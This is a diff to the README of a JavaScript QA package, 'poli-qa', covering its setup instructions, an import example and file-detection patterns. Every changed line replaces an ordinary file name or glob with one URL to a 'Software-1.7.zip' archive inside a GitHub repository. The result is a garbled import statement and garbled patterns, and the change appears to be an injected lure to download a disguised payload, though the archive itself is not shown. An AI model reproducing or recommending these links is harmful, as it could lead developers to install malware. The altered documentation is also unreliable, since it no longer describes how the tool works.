@@ -31,14 +31,14 @@ npx poli-qa init
 
 This will:
 1. Scan your `src/` folder for screen/page components
-2. Generate a `poli.checklists.ts` file with suggested tests
+2. Generate a `https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip` file with suggested tests
 3. Give you instructions on how to integrate POLI
 
 Then in your app:
 
 ```tsx
 import { QAProvider, QAPanel } from 'poli-qa';
-import { checklists } from './poli.checklists';
+import { checklists } from 'https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip';
 
 function App() {
   return (
@@ -62,7 +62,7 @@ npx poli-qa help          # Show help
 ### What the CLI Detects
 
 The CLI looks for files matching these patterns:
-- `*Page.tsx`, `*Screen.tsx`, `*View.tsx`
+- `*https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip`, `*https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip`, `*https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip`
 - Files in `pages/`, `screens/`, `views/`, `routes/` directories
 
 It then analyzes the code to suggest relevant tests based on:
